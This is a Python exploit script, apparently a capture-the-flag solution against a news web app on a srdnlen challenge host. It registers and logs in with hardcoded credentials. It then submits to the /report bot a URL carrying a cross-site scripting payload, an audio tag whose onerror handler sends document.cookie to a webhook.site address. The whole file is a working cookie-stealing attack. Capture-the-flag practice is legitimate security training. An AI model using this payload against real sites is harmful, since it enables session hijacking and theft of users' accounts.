import requests


URL      = "http://breaking-news.challs.srdnlen.it"

USERNAME = "srdnlen"
PASSWORD = "ha%LAK4SFLW%AjLk*@#6!hfD"

WEBHOOK  = "https://webhook.site/75b5e1c7-f231-4b3d-b717-2d0ff2db5105"
PAYLOAD  = f"<audio src/onerror=fetch('{WEBHOOK}?p='+document.cookie)>" + ("-" * 87) + "<audio"


session = requests.session()

def register():
    url = f"{URL}/register"
    data = {
        "username": USERNAME,
        "password": PASSWORD
    }
    return session.post(url, data=data)

def login():
    url = f"{URL}/"
    data = {
        "username": USERNAME,
        "password": PASSWORD
    }
    return session.post(url, data=data)

def exploit():
    url = f"{URL}/report"
    data = {
        'url': f"http://breaking-news:3000/news#{PAYLOAD}"
    }
    return session.post(url, data=data)


if __name__ == '__main__':
    print("[+] Loggin as srdnlen user...")
    register()
    login()

    print("[+] Launching exploit...")
    exploit()
